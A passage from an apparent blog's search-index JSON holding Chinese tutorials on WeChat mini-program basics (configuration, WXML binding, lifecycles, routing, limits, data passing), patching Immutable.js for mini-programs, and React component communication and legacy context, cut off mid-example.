&amp;&amp; define.amd ? define(factory) : (global.Immutable = factory());&#125;(this, function () &#123; 'use strict';var SLICE$0 = Array.prototype.slice;....&#125;)); 修改Immutable代码，注释原有模块导出语句，使用module.exports = factory() 强制导出 12345678910(function(global, factory) &#123; /* typeof exports === 'object' &amp;&amp; typeof module !== 'undefined' ? module.exports = factory() : typeof define === 'function' &amp;&amp; define.amd ? define(factory) : (global.Immutable = factory()); */ module.exports = factory();&#125;(this, function() &#123; 导入修改好的immutable到小程序中即可 https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/immutable.js 五、小程序集成redux、immutable模板 https://github.com/poetries/wx-redux-immutable-template","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://ru23.com/tags/小程序/"},{"name":"redux","slug":"redux","permalink":"https://ru23.com/tags/redux/"}]},{"title":"小程序入门总结篇","slug":"2018-08-xiaochengxu-note","date":"2018-08-09T08:20:20.000Z","updated":"2018-10-24T03:46:02.569Z","comments":true,"path":"note/cb152701.html","link":"","permalink":"https://ru23.com/note/cb152701.html","excerpt":"","text":"一、小程序代码组成 须知 App() 必须在 app.js 中注册，且不能注册多个。 编译后的代码包大小需小于 1MB，否则代码包将上传失败。 每个页面需要手动在app.json中进行注册，否则不能访问。 app.json中pages数组的第一项代表小程序的初始页面，小程序中新增/减少页面，都需要对 pages 数组进行修改。 直接修改 this.data无效，无法改变页面的状态，还会造成数据不一致。 单次设置的数据不能超过1024kB，请尽量避免一次设置过多的数据。 不要尝试修改页面栈，会导致路由以及页面状态错误。 tabBar只能配置最少2个、最多5个，tab 按数组的顺序排序。 小程序页面只能同时打开 5 个，如果交互流程较长难以支持。 同时只能存在 5 个url请求。 无法跳转小程序以外的url。 没有cookie。 没有开放加载web页面 没有a标签链接，不可嵌套iframe 没有window变量，但微信提供了wx全局方法集 事件绑定和条件渲染类似Angular，全部写在WXML中 1.1 主体 由app.js、app.json、app.wxss三个文件组成，放在根目录 app.js 根目录的app.js很有用,因为在它内部注册的变量或方法，都是可以被所有页面获取到。可以监听并处理小程序的生命周期、声明全局变量。其余的.js文 件可以通过var app = getApp() 获取其实例，调用其中定义的方法和变量，但不可以调用生命周期的方法 app.json是小程序的全局配置 123pages 配置小程序的组成页面，第一个代表小程序的初始页面window 设置小程序的状态栏、标题栏、导航条、窗口背景颜色tabBar 配置小程序tab栏的样式和对应的页面 app.wxss 是小程序的公共样式表，可以在其他.wxss文件中直接使用 app.json 123456789101112131415161718192021222324252627282930313233343536\"pages\": [ //设置页面的路径 \"pages/index/index\", //不需要写index.wxml,index.js,index,wxss,框架会自动寻找并整合 \"pages/logs/logs\"],\"window\": &#123; //设置默认窗口的表现形式 \"navigationBarBackgroundColor\": \"#ffffff\", //顶部导航栏背景色 \"navigationBarTextStyle\": \"black\", //顶部导航文字的颜色 black/white \"navigationBarTitleText\": \"微信接口功能演示\", //顶部导航的显示文字 \"backgroundColor\": \"#eeeeee\", //窗口的背景色 \"backgroundTextStyle\": \"light\", //下拉背景字体、loading 图的样式，仅支持 dark/light \"enablePullDownRefresh\": \"false\"， //是否支持下拉刷新 ，不支持的话就直接不写！ \"disableScroll\": true, // 设置true不能上下滚动，true/false，注意！只能在 page.json 中有效，无法在 app.json 中设置该项。&#125;,\"tabBar\": &#123; //底部tab或者顶部tab的表现，是个数组，最少配置2个，最多5个 \"list\": [&#123; //设置tab的属性，最少2个，最多5个 \"pagePath\": \"pages/index/index\", //点击底部 tab 跳转的路径 \"text\": \"首页\", //tab 按钮上的文字 \"iconPath\": \"../img/a.png\", //tab图片的路径 \"selectedIconPath\": \"../img/a.png\" //tab 在当前页，也就是选中状态的路径 &#125;, &#123; \"pagePath\": \"pages/logs/logs\", \"text\": \"日志\" &#125;], \"color\": \"red\", //tab 的字体颜色 \"selectedColor\": \"#673ab7\", //当前页 tab 的颜色，也就是选中页的 \"backgroundColor\": \"#2196f3\", //tab 的背景色 \"borderStyle\": \"white\", //边框的颜色 black/white \"position\": \"bottom\" //tab处于窗口的位置 top/bottom &#125;,\"networkTimeout\": &#123; //默认都是 60000 秒一分钟 \"request\": 10000, //请求网络超时时间 10000 秒 \"downloadFile\": 10000， //链接服务器超时时间 10000 秒 \"uploadFile\": \"10000\", //上传图片 10000 秒 \"downloadFile\": \"10000\" //下载图片超时时间 10000 秒 &#125;,\"debug\": true //项目上线后，建议关闭此项，或者不写此项 1.2 pages pages文件夹里是小程序的各个页面，每个界面一般都由.wxml、.wxss、.js、.json四个文件组成，四个文件必须是相同的名字和路径 .js 是页面的脚本代码，通过Page()函数注册页面。可以指定页面的初始数据、生命周期、事件处理等 .wxml 是页面的布局文件，只能使用微信定义的组件 .wxss 是样式表，需要注意 尺寸单位：rpx 可以根据屏幕的宽带进行自适应 样式导入：@import导入外联样式表，如：@import &quot;test.wxss&quot;; 定义在app.wxss中的全局样式，作用于每个页面。定义在page的.wxss文件只作用于对应的页面，会覆盖app.wxss中相同的选择器 .json 是页面的配置文件，只能设置app.json中的window配置内容，会覆盖app.json中window的相同配置项，即使不配置任何东西也需要写{},否则会报错 1.3 utils utils 里面包含一些公共的代码抽取的js文件，作为模块方便使用。模块通过module.exports对外暴露接口 其他地方使用是var utils = require(&#39;../../utils/util.js&#39;) 进行引用 二、视图层 WXML2.1 数据绑定 传统的视图和数据绑定 那么微信小程序是通过什么方法来管理视图和对象绑定的呢,状态模式-单向数据流 数据流向是单向的，即视图变化不会影响对象状态 用户触发事件不仅要考虑当前UI元素更新，还会通过当前元素更新其他视图。 所以视图上的数据都必须用过事件传递给对象，只有用户操作视图，才能获取到数据，并更新对象状态 image.png .wxml 中的动态数据都来自Page中的data。数据绑定使用数据绑定使用双大括号将变量包起来，可以作用于内容、组件属性(需要在双引号之内)、控制属性(需要在双引号之内)、关键字(需要在双引号之内) 1234567Page(&#123; data: &#123; message: \"Hello\", id:0, status: true &#125;&#125;) 1234&lt;view&gt; &#123;&#123;message&#125;&#125; &lt;/view&gt;&lt;view id=&quot;item-&#123;&#123;id&#125;&#125;&quot;&gt; &lt;/view&gt;&lt;view wx:if=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; &lt;/view&gt;&lt;view hidden=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; &lt;/checkbox&gt; 还可以进行简单的运算在大括号里 1234&lt;view hidden=&quot;&#123;&#123;status ? true : false&#125;&#125;&quot;&gt; Hidden &lt;/view&gt;&lt;view&gt; &#123;&#123;a + b&#125;&#125; + c &lt;/view&gt; &lt;view wx:if=&quot;&#123;&#123;num &gt; 6&#125;&#125;&quot;&gt; &lt;/view&gt;&lt;view&gt;&#123;&#123;&quot;hello&quot; + word&#125;&#125;&lt;/view&gt; 2.2 条件渲染 用 wx:if=””来判断是否渲染代码块 1&lt;view wx:if=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; isShow &lt;/view&gt; 还可以添加else块 123&lt;view wx:if=&quot;&#123;&#123;num &gt; 5&#125;&#125;&quot;&gt; A &lt;/view&gt;&lt;view wx:elif=&quot;&#123;&#123;num &gt; 2&#125;&#125;&quot;&gt; B &lt;/view&gt;&lt;view wx:else&gt; C &lt;/view&gt; 2.3 列表渲染 在组件上使用 wx:for属性绑定一个数组，就可以渲染组件了 默认情况下数组的当前下标变量名为index,当前项的变量名为item 123&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot;&gt; &#123;&#123;index&#125;&#125;: &#123;&#123;item.message&#125;&#125;&lt;/view&gt; 12345Page(&#123; data: &#123; array: [\"AA\",\"BB\",\"CC\"] &#125;&#125;) 使用 wx:for-item 可以指定数组当前元素的变量名，使用 wx:for-index 可以指定数组当前下标的变量名 123&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot; wx:for-index=&quot;num&quot; wx:for-item=&quot;itemName&quot;&gt; &#123;&#123;num&#125;&#125;: &#123;&#123;itemName&#125;&#125;&lt;/view&gt; 2.4 模板template name 定义组件模版的名称，引用模版的时候使用 is 属性指定模版的名字，is 可以进行简单的三目运算，需要传入模版需要的 data 数据。 因为模版拥有自己的作用域，所以只能使用 data 传入数据，而不接受双花括号的写法 123456789&lt;template name=&quot;msgItem&quot;&gt;&lt;view&gt;&lt;text&gt; &#123;&#123;index&#125;&#125;: &#123;&#123;msg&#125;&#125; &lt;/text&gt;&lt;text&gt; Time: &#123;&#123;time&#125;&#125; &lt;/text&gt;&lt;/view&gt;&lt;/template&gt;&lt;!-- 其他代码 --&gt;&lt;template is=&quot;msgItem&quot; data=&quot;&#123;&#123;...item&#125;&#125;&quot;/&gt; 2.5 公共模块的引用 WXML 提供 import 和 include 两种文件引用方式。 import 有作用域的概念，不能多重引用 1234567&lt;!-- B.wxml --&gt;&lt;import src=&quot;a.wxml&quot;/&gt;&lt;!-- A.wxml --&gt;&lt;template name=&quot;A&quot;&gt; &lt;text&gt; A template &lt;/text&gt;&lt;/template&gt; include 就可以多重引用 1234567&lt;!--引用 header、其中 header.wxml 中也引用了 footer.wxml--&gt;&lt;include src=&quot;header.wxml&quot;/&gt;&lt;view&gt; body &lt;/view&gt;&lt;!-- header.wxml --&gt;&lt;view&gt; header &lt;/view&gt;&lt;include src=&quot;footer.wxml&quot;/&gt; 2.6 事件 名称以 bind 开头的事件不阻止冒泡，名称以 catch 开头的事件冒泡是阻止的。如 bindTap 和 catchTab 在 WXML 中，可以使用 dataset 定义data中的数据，会通过事件传递。它的事件以 data-开头，多个单词以 - 链接，如 data-a-b 三、生命周期3.1 App()应用生命周期 用户首次打开小程序，触发 onLaunch（全局只触发一次）。 小程序初始化完成后，触发onShow方法，监听小程序显示。 小程序从前台进入后台，触发 onHide方法。 小程序从后台进入前台显示，触发 onShow方法。 小程序后台运行一定时间，或系统资源占用过高，会被销毁。 小程序出错，触发onError 前台、后台定义： 当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台 12345678910111213141516//app.jsApp(&#123; onLaunch: function() &#123; //小程序初始化(全局只触发一次) &#125;, onShow: function() &#123; //小程序显示 &#125;, onHide: function() &#123; //小程序隐藏 &#125;, onError: function(msg) &#123; //小程序错误 &#125;,&#125;)//其他 开发者可以添加任意的函数或数据到 Object 参数中，用 this 可以访问 3.2 Page页面生命周期 每个页面也有自己的生命周期 小程序注册完成后，加载页面，触发onLoad方法。 页面载入后触发onShow方法，显示页面。 首次显示页面，会触发onReady方法，渲染页面元素和样式，一个页面只会调用一次。 当小程序后台运行或跳转到其他页面时，触发onHide方法。 当小程序有后台进入到前台运行或重新进入页面时，触发onShow方法。 当使用重定向方法wx.redirectTo(OBJECT)或关闭当前页返回上一页wx.navigateBack()，触发onUnload 12345678910111213141516171819//index.jsPage(&#123; onLoad: function(options) &#123; //页面加载-----(一个页面只会调用一次) &#125;, onReady: function() &#123; //页面渲染-----(一个页面只会调用一次) &#125;, onShow: function() &#123; //页面显示-----(每次打开页面都会调用一次) &#125;, onHide: function() &#123; //页面隐藏-----(当navigateTo或底部tab切换时调用) &#125;, onUnload: function() &#123; //页面卸载-----(当redirectTo或navigateBack的时候调用) &#125;,&#125;)//其他 开发者可以添加任意的函数或数据到 object 参数中，在页面的函数中用 this 可以访问 3.3 应用生命周期影响页面生命周期 image.png 小程序初始化完成后，页面首次加载触发onLoad，只会触发一次。 当小程序进入到后台，先执行页面onHide方法再执行应用onHide方法。 当小程序从后台进入到前台，先执行应用onShow方法再执行页面onShow方法 四、小程序限制4.1 程序限制 脚本内不能使用window等对象 zepto/jquery 会使用到window对象和document对象，所以无法使用。 样式表不支持级联选择器 本地资源无法通过 css 获取 background-image可以使用网络图片，或者 base64，或者使用标签 不支持 A 标签，无法打开普通网页 4.2 数量限制 底部或顶部可以添加tab按钮区域 tabBar 是一个数组，只能配置最少2个、最多5个 tab，tab按数组的顺序排序。 一个应用同时只能打开5个页面 小程序的wx.request请求最开始最大并发数是5个，后来，估计随着用小程序的越来越多，总之，就是增加到了10个 4.3 大小限制 tabBar 上面的按钮 iconPath 图片路径，icon大小限制为40kb tabBar 上面的按钮 selectedIconPath选中时的图片路径，icon 大小限制为40kb setData 页面传递数据单次设置的数据不能超过1024kB setStorage 本地缓存最大为10MB 小程序源码打包后的大小限制为1M 五、路由 微信路由接口有三个，分别是wx.redirectTo、wx.navigateTo和wx.switchTabwx.navigateTo全局最多调用5次 如果某页面设置为tab页，则只支持wx.switchTab，不支持其他两种路由方式访问 5.1 哪些情况会触发页面跳转 小程序启动，初始化第一个页面 打开新页面，调用 API wx.navigateTo 或使用&lt;navigator /&gt;组件 页面重定向，调用 API wx.redirectTo 或使用&lt;navigator /&gt;组件 页面返回，调用 API wx.navigateBack或用户按左上角返回按钮 tarbar切换 5.2 如何跳转页面 使用wx.navigateTo接口跳转,原页面保留 123456wx.navigateTo(&#123; //目的页面地址 url: 'pages/logs/index', success: function(res)&#123;&#125;, ...&#125;) 使用wx.redirectTo接口跳转，关闭原页面,不能返回 123456wx.redirectTo(&#123; //目的页面地址 url: 'pages/logs/index', success: function(res)&#123;&#125;, ...&#125;) 5.3 使用组件1&lt;navigator url=&quot;pages/logs/index&quot; hover-class=&quot;navigator-hover&quot;&gt;跳转&lt;/navigator&gt; 当该组件添加redirect属性时，等同于wx.redirectTo接口；默认redirect属性为false，等同于wx.navigateTo接口 用户点击左上角返回按钮，或调用wx.navigateBack接口返回上一页 123wx.navigateBack(&#123; delta: 1&#125;) delta为1时表示返回上一页，为2时表示上上一页，以此类推；如果dalta大于已打开的页面总数，则返回到首页。返回后，元界面会销毁 5.4 页面跳转传值1url?key=value&amp;key1=value1 传递的参数没有被URIEncode,传递中文没有乱码 5.5 如何正确使用页面跳转 官方规定小程序最多只能有五个页面同时存在，意思是在不关闭页面的情况，最多新开五个页面，页面深度为5 对于可逆操作，使用wx.navigateTo,比如从首页跳转到二级页面，从二级页面返回是不需要重新渲染首页 对于不可逆操作，使用wx.redirectTo,比如用户登录成功后，关闭登录页面，不能返回到登录界面。 对于一些介绍性等不常用页面wx.redirectTo或wx.navigatrBack 不要在首页使用wx.redirectTo，这样会导致应用无法返回首页 5.6 页面栈 页面栈以栈（先进后出）的形式维护页面与页面之间的关系 小程序提供了getCurrentPages()函数获取页面栈，第一个元素为首页，最后一个元素为当前页面 使用wx.navigateTo每新开一个页面，页面栈大小加1,直到页面栈大小为5为止 image.png 使用wx.navigateTo重复打开界面 image.png 假如使用wx.navigateTo从四级页面跳转到二级页面，此时会在页面栈顶添加一个与二级页面初始状态一样的界面，但两个页面状态是独立的。页面栈大小会加1，如果页面栈大小为5，则wx.navigateTo无效 使用wx.redirectTo重定向 image.png 假如使用wx.redirectTo从四级页面重定向到二级页面，此时会将关闭四级页面，并使用二级页面替换四级页面，但两个页面状态是独立的。此时的页面栈大小不变，请注意和使用wx.navigateTo的区别 使用wx.navigateBack返回 image.png 总结 wx.navigateTo会增加页面栈大小，直到页面栈大小为5 wx.redirectTo不会增加页面栈大小 wx.navigateBack会减少页面栈大小，直到页面栈大小为1 六、数据通信6.1 页面之间的通信 使用全局变量 app.globalData 使用本地缓存 wx.setStorageSync url传递** 12345678910111213141516// A页面-传递数据// 需要注意的是，wx.switchTab 中的 url 不能传参数。wx.navigateTo(&#123; url:'../pageD/pageD?name=raymond&amp;gender=male'&#125;)// B页面-接收数据////通过onLoad的option...Page(&#123;onLoad: function(option)&#123; console.log(option.name +'is'+ option.gender)// raymond is male this.setData(&#123;option: option &#125;)&#125;&#125;) 6.2 参数传递6.2.1 小程序传递参数的方式1、通过在App.js中设置全局变量 通常把不会更改的数据放在app.js的Data中，在各个页面中都可以通过APP实例获取Data数据 12var app = getApp();var data = app.data; 2、通过拼接URL直接传递 wx.navigateTo({})中URL携带参数 123wx.navigateTo(&#123; url: &apos;test?id=1&apos;&#125;); 在wxml中使用navigator跳转url传递参数 代码如下，将要传递到另一个页面的字符串testId的值赋值到url中 1&lt;navigator class=&quot;test-item&quot; url=&quot;../../pages/test/test?testId=&#123;&#123;testData.testId&#125;&#125;&quot;&gt;&lt;/navigator&gt; 在js页面中onLoad方法中接收 123456Page(&#123; onLoad: function(options) &#123; var testId = options.testId console.log(testId) &#125;&#125;) navigator跳转url传递数组 如果一个页面要将一个数组，如相册列表传递到另一个页面 1&lt;navigator class=&quot;test-item&quot; url=&quot;../../pages/test/test?albumList=&#123;&#123;testData.albumList&#125;&#125;&quot;&gt;&lt;/navigator&gt; 传递到js后从options中得到的是个字符串，每个图片的url通过’,’分隔，所以此时还需要对其进行处理，重新组装为数组 12345678910111213Page(&#123; data: &#123; // 相册列表数据 albumList: [], &#125;, onLoad: function (options) &#123; var that = this; that.setData(&#123; albumList: options.albumList.split(\",\") &#125;); &#125;&#125;) 3、在wxml中绑定事件后，通过data-hi=&quot;参数&quot;的方式传递 这种方式一般是在wxml中绑定事件，同时设置需要传递的数据，如果需要传递多个，可以写多个data-[参数]的方式进行传递 123&lt;view bindtap=&quot;clickMe&quot; data-testId=&#123;&#123;testId&#125;&#125;&quot;&gt; ...&lt;/view&gt; 在js页面中自定义方法clickMe中接收 12345678Page(&#123; clickMe: function(event) &#123; var testId = event.currentTarget.dataset.testid; wx.navigateTo(&#123; url: '../../pages/test/test' &#125;) &#125;&#125;) wxml中配置data-albumlist传递数组 123&lt;view bindtap=&quot;clickMe&quot; data-albumlist=&#123;&#123;testData.albumList&#125;&#125;&quot;&gt; &lt;/view&gt; 12345678910在js页面中自定义方法clickMe中接收Page(&#123; clickMe: function(event) &#123; var albumList = event.currentTarget.dataset.albumlist.split(\",\"); wx.navigateTo(&#123; url: '../../pages/test/test' &#125;) &#125;&#125;) 4、通过数据缓存存储再获取 wx.setStorageSync(KEY,DATA)存储数据 1234try &#123; wx.setStorageSync(&apos;key&apos;, &apos;value&apos;)&#125; catch (e) &#123; &#125; wx.getStorageSync(KEY)获取数据 123456789101112131415try &#123; var value = wx.getStorageSync('key') if (value) &#123; // Do something with return value &#125;&#125; catch (e) &#123; // Do something when catch error&#125;或wx.getStorage(&#123; key: 'key', success: function(res) &#123; console.log(res.data) &#125;&#125;) 七、疑问汇总为什么脚本内不能使用window等对象 页面的脚本逻辑是在JsCore中运行，JsCore是一个没有窗口对象的环境，所以不能在脚本中使用window，也无法在脚本中操作组件 为什么 zepto/jquery 无法使用 zepto/jquery 会使用到window对象和document对象，所以无法使用 wx.navigateTo无法打开页面 一个应用同时只能打开5个页面，当已经打开了5个页面之后，wx.navigateTo不能正常打开新页面。请避免多层级的交互方式，或者使用wx.redirectTo 样式表不支持级联选择器 WXSS支持以.开始的类选择器 本地资源无法通过 css 获取 background-image：可以使用网络图片，或者 base64，或者使用&lt;image/&gt;标签 如何修改窗口的背景色 使用 page 标签选择器，可以修改顶层节点的样式 12345page &#123; display: block; min-height: 100%; background-color: red;&#125; 为什么上传不成功 为了提升体验流畅度，编译后的代码包大小需小于 1MB ，大于 1MB 的代码包将上传失败 HTTPS 请求不成功 tls 仅支持 1.2 及以上版本 微信小程序支持fetch或者promise吗? promise工具目前不支持，fetch 客户端不支持 工具下个版本保持统一 wx.request的POST方法的参数传输服务器接收不到的bug wx.request post 的 content-type 默认为 ‘application/json &#39; 如果服务器没有用到 json 解释的话，可以把 content-type 设置回 urlencoded 12345678wx.request(&#123;....method: \"POST\",header: &#123;\"content-type\": \"application/x-www-form-urlencoded\"&#125;,...&#125;) wx.uploadFile在手机上返回http码403 安卓的微信升级到6.5.2及其以上版本 小程序SVG支持吗? image的src放远程svg可以，background-image里也可以 ipad不能使用小程序？ 暂时不支持ipad打开小程序 请问小程序页内支持长按保存图片或分享图片吗？ 目前没有这个功能 微信小程序不支持cookie 使用Reids存储session 有些手机不支持Object.assign方法，如果使用了该方法会出现莫名其妙的报错（并不会提示Object.assign is not function，而是导致调用了Object.assign方法的方法不能被调用）！ 直接写一个合并对象的方法 123456function assignObject(o, n) &#123; for (var p in n) &#123; if (n.hasOwnProperty(p) &amp;&amp; (!o.hasOwnProperty(p))) o[p] = n[p]; &#125;&#125; 八、小程序组件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"小程序","slug":"小程序","permalink":"https://ru23.com/tags/小程序/"}]},{"title":"React之组件通信方式","slug":"2018-07-react-comp-communicate","date":"2018-07-29T15:20:24.000Z","updated":"2018-10-24T03:46:02.497Z","comments":true,"path":"note/6d683f02.html","link":"","permalink":"https://ru23.com/note/6d683f02.html","excerpt":"","text":"组件通信 组件之进行通信的几种情况 父组件向子组件通信 子组件向父组件通信 跨级组件通信 没有嵌套关系组件之间的通信 一、父组件向子组件通信 React数据流动是单向的,父组件向子组件通信也是最常见的;父组件通过props向子组件传递需要的信息 1234567891011121314151617181920212223242526272829// Child.jsximport React from 'react';import PropTypes from 'prop-types';export default function Child(&#123; name &#125;) &#123; return &lt;h1&gt;Hello, &#123;name&#125;&lt;/h1&gt;;&#125;Child.propTypes = &#123; name: PropTypes.string.isRequired,&#125;// Parent.jsximport React, &#123; Component &#125; from 'react';import Child from './Child';class Parent extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;Child name=\"Sara\" /&gt; &lt;/div&gt; ); &#125;&#125;export default Parent; 二、子组件向父组件通信 利用回调函数 利用自定义事件机制 实现在子组件中点击隐藏组件按钮可以将自身隐藏的功能 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';class List3 extends Component &#123; static propTypes = &#123; hideConponent: PropTypes.func.isRequired, &#125; render() &#123; return ( &lt;div&gt; 哈哈,我是List3 &lt;button onClick=&#123;this.props.hideConponent&#125;&gt;隐藏List3组件&lt;/button&gt; &lt;/div&gt; ); &#125;&#125;export default List3;//app.jsximport React, &#123; Component &#125; from 'react';import List3 from './components/List3';export default class App extends Component &#123; constructor(...args) &#123; super(...args); this.state = &#123; isShowList3: false, &#125;; &#125; showConponent = () =&gt; &#123; this.setState(&#123; isShowList3: true, &#125;); &#125; hideConponent = () =&gt; &#123; this.setState(&#123; isShowList3: false, &#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.showConponent&#125;&gt;显示Lists组件&lt;/button&gt; &#123; this.state.isShowList3 ? &lt;List3 hideConponent=&#123;this.hideConponent&#125; /&gt; : null &#125; &lt;/div&gt; ); &#125;&#125; 三、跨级组件通信层层组件传递props 例如A组件和B组件之间要进行通信,先找到A和B公共的父组件,A先向C组件通信,C组件通过props和B组件通信,此时C组件起的就是中间件的作用 使用context context是一个全局变量,像是一个大容器,在任何地方都可以访问到,我们可以把要通信的信息放在context上,然后在其他组件中可以随意取到 但是React官方不建议使用大量context,尽管他可以减少逐层传递,但是当组件结构复杂的时候,我们并不知道context是从哪里传过来的;而且context是一个全局变量,全局变量正是导致应用走向混乱的罪魁祸首 下面例子中的组件关系: ListItem是List的子组件,List是app的子组件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// ListItem.jsximport React, &#123; Component &#125; from 'react';import PropTypes from 'prop-types';class ListItem extends Component &#123; // 子组件声明自己要使用context static contextTypes = &#123; color: PropTypes.string, &#125; static propTypes = &#123; value: PropTypes.string, &#125; render() &#123; const &#123; value &#125; = this.props; return ( &lt;li style=&#123;&#123; background: this.context.color &#125;&#125;&gt; &lt;span&gt;&#123;value&#125;&lt;/span&gt; &lt;/li&gt; ); &#125;&#125;export default ListItem;// List.jsximport ListItem from './ListItem';class List extends Component &#123; // 父组件声明自己支持context static childContextTypes = &#123; color: PropTypes.string, &#125; static propTypes = &#123; list: PropTypes.array, &#125; // 提供一个函数,用来返回相应的context对象 getChildContext() &#123; return &#123; color: 'red', &#125;; &#125; render() &#123; const &#123; list &#125; = this.props; return ( &lt;div&gt; &lt;ul&gt; &#123; list.map((entry, index) =&gt; &lt;ListItem key=&#123;`list-$&#123;index&#125;`&#125; value=&#123;entry.text&#125; /&gt;, ) &#125; &lt;/ul&gt; &lt;/div&gt; ); &#125;&#125;export default List;// App.jsximport React, &#123; Component &#125; from 'react';import List from './components/List';const list = [ &#123; text: '题目一', &#125;, &#123; text: '题目二', &#125;,];export default class App extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;List list=&#123;list&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 四、没有嵌套关系的组件通信使用自定义事件机制 在componentDidMount事件中,如果组件挂载完成,再订阅事件;在组件卸载的时候,在componentWillUnmount事件中取消事件的订阅; 以常用的发布/订阅模式举例,借用Node.js Events模块的浏览器版实现 下面例子中的组件关系: List1和List2没有任何嵌套关系,App是他们的父组件 实现这样一个功能: 点击List2中的一个按钮,改变List1中的信息显示 1npm install events --save 在src下新建一个util目录里面建一个events.js 123import &#123; EventEmitter &#125; from &apos;events&apos;;export default new EventEmitter(); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// List.jsxclass List extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; message: 'List1', &#125;; &#125; componentDidMount() &#123; // 组件装载完成以后声明一个自定义事件 this.eventEmitter = emitter.addListener('changeMessage', (message) =&gt; &#123; this.setState(&#123; message, &#125;); &#125;); &#125; componentWillUnmount() &#123; emitter.removeListener(this.eventEmitter); &#125; render() &#123; return ( &lt;div&gt; &#123;this.state.message&#125; &lt;/div&gt; ); &#125;&#125;export default List;//List2.jsximport React, &#123; Component &#125; from 'react';import emitter from '../util/events';class List2 extends Component &#123; handleClick = (message) =&gt; &#123; emitter.emit('changeMessage', message); &#125;; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick.bind(this, 'List2')&#125;&gt;点击我改变List1组件中显示信息&lt;/button&gt; &lt;/div&gt; ); &#125;&#125;// APP.jsximport React, &#123; Component &#125; from 'react';import List1 from './components/List1';import List2 from './components/List2';export default class App extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;List1 /&gt; &lt;List2 /&gt; &lt;/div&gt; ); &#125;&#125; 自定义事件是典型的发布订阅模式,通过向事件对象上添加监听器和触发事件来实现组件之间的通信 五、总结 父组件向子组件通信: props 子组件向父组件通信: 回调函数/自定义事件 跨级组件通信: 层层组件传递props/context 没有嵌套关系组件之间的通信: 自定义事件","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"},{"name":"组件通信","slug":"组件通信","permalink":"https://ru23.com/tags/组件通信/"}]},{"title":"React之context","slug":"2018-07-react-context","date":"2018-07-23T01:50:12.000Z","updated":"2018-10-24T03:46:02.499Z","comments":true,"path":"note/904e3313.html","link":"","permalink":"https://ru23.com/note/904e3313.html","excerpt":"","text":"简介 React 组件之间的通信是基于 props 的单向数据流，即父组件通过 props 向子组件传值，亦或是子组件执行传入的函数来更新父组件的state，这都满足了我们大部分的使用场景 一般地，对于兄弟组件之间的通信，是通过它们共同的祖先组件进行的，即 Lifting State Up，官方文档也有介绍。组件一通过事件将状态变更通知它们共同的祖先组件，祖先组再将状态同步到组件二 但是，如果组件之间嵌套的比较深，即使提升状态到共同父组件，再同步状态到相应的组件还是需要一层一层的传递下去，可能会比较繁琐 在对应的场景中，context 就可以缩短父组件到子组件的属性传递路径 例1123456789101112131415161718192021222324252627282930313233343536373839import Parent from './Parent'import ChildOne from '../components/ChildOne'import ChildTwo from '../components/ChildTwo'export default class Container extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; value: '' &#125; &#125; changeValue = value =&gt; &#123; this.setState(&#123; value &#125;) &#125; getChildContext() &#123; return &#123; value: this.state.value, changeValue: this.changeValue &#125; &#125; render() &#123; return ( &lt;div&gt; &lt;Parent&gt; &lt;ChildOne /&gt; &lt;/Parent&gt; &lt;Parent&gt; &lt;ChildTwo /&gt; &lt;/Parent&gt; &lt;/div&gt; ) &#125;&#125;Container.childContextTypes = &#123; value: PropTypes.string, changeValue: PropTypes.func&#125; Parent.jsx 1234567import React from \"react\"const Parent = (props) =&gt; ( &lt;div &#123;...props&#125; /&gt;)export default Parent ChildOne.jsx 1234567891011121314151617181920export default class ChildOne extends React.Component &#123; handleChange = (e) =&gt; &#123; const &#123; changeValue &#125; = this.context changeValue(e.target.value) &#125; render() &#123; return ( &lt;div&gt; 子组件一 &lt;input onChange=&#123;this.handleChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125;ChildOne.contextTypes = &#123; changeValue: PropTypes.func&#125; ChildTwo.jsx 1234567891011121314export default class ChildTwo extends React.Component &#123; render() &#123; return ( &lt;div&gt; 子组件二 &lt;p&gt;&#123;this.context.value&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125;ChildTwo.contextTypes = &#123; value: PropTypes.string&#125; 在 Container.childContextTypes 中进行接口的声明，通过 getChildContext 返回更新后的state，在 Child.contextTypes 中声明要获取的接口，这样在子组件内部就能通过 this.context 获取到。通过 Context 这样一个中间对象，ChildOne 和 ChildTwo 就可以相互通信了 例2 组件嵌套传递属性，在导航里面引用Page中的变量 使用context来传递 使用props层级传递 使用context组件需要定义propTypes,需要严格校验、声明类型、字段 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Page extends React.Component &#123; static childContextTypes = &#123; user:PropTypes.string &#125; constructor(props)&#123; super(props) this.state = &#123;user:'poetries'&#125; &#125; getChildContext()&#123; return this.state &#125; render()&#123; return ( &lt;div&gt; &lt;p&gt;我是&#123;this.state.user&#125;&lt;/p&gt; &lt;Siderbar /&gt; &lt;/div&gt; ) &#125;&#125;class Siderbar extends React.Component &#123; static childContextTypes = &#123; user:PropTypes.string &#125; render()&#123; return ( 